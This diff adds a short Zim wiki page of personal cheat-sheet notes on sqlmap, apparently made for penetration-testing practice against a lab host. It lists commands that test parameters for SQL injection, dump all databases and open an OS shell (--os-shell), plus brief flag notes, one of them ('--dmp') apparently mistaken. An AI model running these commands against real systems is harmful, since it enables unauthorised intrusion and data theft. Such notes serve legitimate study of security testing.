@@ -1,0 +1,26 @@
+Content-Type: text/x-zim-wiki
+Wiki-Format: zim 0.4
+Creation-Date: 2020-05-17T07:47:33-04:00
+
+====== sqlmap ======
+Created Sunday 17 May 2020
+
+**sqlmap -u {url }**
+
+**sqlmap -u http://10.11.0.22/debug.php?id=1 -p "id"**
+
+**sqlmap -u 'http://&lt;ip>/login.php' --forms --risk=3 --level=5 --dbs**
+**--os-shell**
+**--dump-all**
+**--dbms=mysql**
+
+-g to use google dork 
+-p for define which parameter to test
+--dbms to set databse
+--level to set level
+--dmp to dump all database
+-D to enumerate db
+-T to emumerate table
+-C to emumerate column
+
+
